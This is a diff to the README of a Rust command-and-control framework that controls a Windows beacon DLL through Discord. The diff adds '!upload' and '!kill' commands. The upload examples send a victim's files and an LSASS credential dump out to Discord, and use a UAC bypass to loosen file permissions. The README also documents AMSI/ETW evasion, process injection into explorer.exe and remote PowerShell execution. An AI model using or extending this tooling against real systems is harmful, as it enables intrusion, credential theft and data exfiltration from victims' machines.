@@ -19,7 +19,7 @@ FrameworkC2 is a modular Command & Control framework written in Rust, designed t
 ```mermaid
 flowchart TB
     subgraph Operator["Operator (Discord Server)"]
-        Commands["Commands: shell, scr, !loaddll, !uacbypass"]
+        Commands["Commands: shell, scr, !loaddll, !upload, !uacbypass, !kill"]
     end
 
     subgraph Target["Target Machine (Windows)"]
@@ -81,7 +81,7 @@ FrameworkC2/
 │   ├── Cargo.toml
 │   └── src/main.rs            # Injection into explorer.exe
 │
-├── beacon_rust/               # Beacon DLL
+├── beacon/               # Beacon DLL
 │   ├── Cargo.toml
 │   ├── config.toml            # Embedded configuration
 │   └── src/
@@ -97,6 +97,8 @@ FrameworkC2/
 │           ├── shell.rs       # PowerShell execution
 │           ├── screenshot.rs  # Multi-monitor capture
 │           ├── loaddll.rs     # PE loader integration
+│           ├── upload.rs      # File upload to Discord
+│           ├── kill.rs        # Beacon self-termination
 │           └── uacbypass.rs   # UAC bypass via CMSTPLUA
 │
 ├── tools/                     # Helper tools
@@ -122,11 +124,13 @@ FrameworkC2/
 - Discord C2 communication
 - AMSI/ETW bypass (hardware breakpoints)
 - Commands:
-  - `shell <command>` - Execute PowerShell
-  - `scr` - Screenshot all monitors
+  - `!shell <command>` - Execute PowerShell
+  - `!scr` - Screenshot all monitors
   - `!loaddll` - Load DLL from attachment (XOR encrypted)
+  - `!upload <path>` - Upload file from target to Discord (chunked, handles locked files)
   - `!uacbypass [cmd]` - Execute command with elevated privileges
-  - `help` - Show available commands
+  - `!kill` - Terminate the beacon (unload DLL)
+  - `!help` - Show available commands
 
 ### PE Loader (c2_common)
 - Full PE64 parsing
@@ -548,7 +552,7 @@ cargo build --release --target x86_64-pc-windows-gnu --package loader
 
 ### Beacon Configuration
 
-Edit `beacon_rust/config.toml` before building:
+Edit `beacon/config.toml` before building:
 
 ```toml
 [discord]
@@ -585,11 +589,37 @@ xor_key = "41"  # Hex key for loaddll decryption
 
 | Command | Format | Description |
 |---------|--------|-------------|
-| Shell | `shell <cmd>` | Execute PowerShell command |
-| Screenshot | `scr` | Capture all monitors to PNG |
+| Shell | `!shell <cmd>` | Execute PowerShell command |
+| Screenshot | `!scr` | Capture all monitors to PNG |
 | Load DLL | `!loaddll [name]` | Load XOR-encrypted DLL from attachment |
+| Upload | `!upload <path>` | Upload a file from target to Discord |
 | UAC Bypass | `!uacbypass [cmd]` | Execute with elevated privileges |
-| Help | `help` | Show available commands |
+| Kill | `!kill` | Terminate the beacon (unload DLL) |
+| Help | `!help` | Show available commands |
+
+### Uploading Files
+
+The `!upload` command reads a file from the target machine and sends it as a Discord attachment.
+
+- **Locked files**: Opens with `FILE_SHARE_READ|WRITE|DELETE` flags to read files held by other processes
+- **SeDebugPrivilege**: Automatically enabled before reading (helps with protected files when running elevated)
+- **Chunking**: Files > 7 MB are automatically split into parts (`file.dmp.part1`, `.part2`, etc.) to fit Discord's upload limit
+
+```bash
+# Simple file upload
+!upload C:\Users\victim\Desktop\secrets.txt
+
+# Upload a locked dump file (beacon must run elevated)
+!upload C:\temp\lsass.dmp
+
+# Reassemble chunked files (PowerShell)
+Get-Content file.dmp.part* -Raw -Encoding Byte | Set-Content file.dmp -Encoding Byte
+
+# Reassemble chunked files (Linux/macOS)
+cat file.dmp.part* > file.dmp
+```
+
+**Note**: For files protected by NTFS ACLs (e.g. LSASS dumps created by SYSTEM), the beacon must run with admin privileges. You can use `!uacbypass icacls <file> /grant Everyone:R` first to grant read access.
 
 ### Loading Additional DLLs
 
